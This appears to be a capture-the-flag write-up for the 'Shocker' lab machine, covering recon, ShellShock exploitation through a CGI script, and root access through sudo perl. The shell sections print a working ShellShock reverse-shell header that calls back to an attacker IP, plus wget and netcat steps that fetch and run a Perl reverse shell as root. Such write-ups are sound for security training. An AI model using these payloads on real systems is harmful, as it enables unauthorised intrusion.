# Recon

All-tcp scan:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.10.56

PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Detailed scan:
```bash
nmap -p 2222,80 -sVC -oA scans/nmap-tcpdetail 10.10.10.56
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Directory enum:
```
feroxbuster -u http://10.10.10.56 -f -n
403      GET       11l       32w      294c http://10.10.10.56/cgi-bin/
200      GET      234l      773w    66161c http://10.10.10.56/bug.jpg
200      GET        9l       13w      137c http://10.10.10.56/
403      GET       11l       32w      292c http://10.10.10.56/icons/
403      GET       11l       32w      300c http://10.10.10.56/server-status/
```

Subdomain scan (even with detailed lists) didnt reveal any new information.


# Shell as shelly

As we can see above, there is a cgi-bin directory present on the server.
From the name of the machine and the presence of this directory,
we can guess, that the machine is vulnerable to ShellShock exploit
via CGI.

First, we will enumerate scripts inside this directory:
```
feroxbuster -u http://10.10.10.56/cgi-bin -f -n -x sh ps1 pl

200      GET        7l       17w      118c http://10.10.10.56/cgi-bin/user.sh
200      GET      234l      773w    66161c http://10.10.10.56/bug.jpg
200      GET        9l       13w      137c http://10.10.10.56/
```

We have found a script (user.sh)! We will now test if it's vulnerable:
```bash
curl -H "User-agent: () { :;}; echo; echo vulnerable" http://shocker.htb/cgi-bin/user.sh
vulnerable

Content-Type: text/plain

Just an uptime test script

 08:26:40 up  1:50,  0 users,  load average: 0.00, 0.04, 0.00
```

It indeed is, as it printed our string (executed the code) along with it's usual 
content.

We will use it to gain revshell:

```bash
nc -lvnp 9001
```

```bash
curl -H "User-agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.13/9001 0>&1" \
    http://shocker.htb/cgi-bin/user.sh
```

When we receive reverse connection, we can read the user flag:

```
290**************************bfd
```

# Shell as root

This box offers really easy privilege escalation. We run:

```bash
sudo -l 

Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Output tells us, that user can run perl as root. That's excellent!
We get PentestMonkey's revshell from [https://www.revshells.com/](https://www.revshells.com/), 
start our listener, and run it.

First, we will copy it to our target machine, via simple python server.

Attack machine:
```bash
sudo python -m http.server 80
```

Target Machine:
```bash
wget 10.10.14.13/shell.pl

wget 10.10.14.13/shell.pl
--2023-08-18 08:32:38--  http://10.10.14.13/shell.pl
Connecting to 10.10.14.13:80... connected.
HTTP request sent, awaiting response... 200 OK
```

After that, we execute it.

Attack machine:
```bash
nc -lvnp 9001
```

Target machine:
```bash
sudo /usr/bin/perl shell.pl
```

With that, we should get reverse connection as root 
and be able read root flag:

```
root@Shocker:/# cd /root
cd /root
root@Shocker:~# ls
ls
root.txt
root@Shocker:~# cat root.txt
cat root.txt
012**************************1a0
```
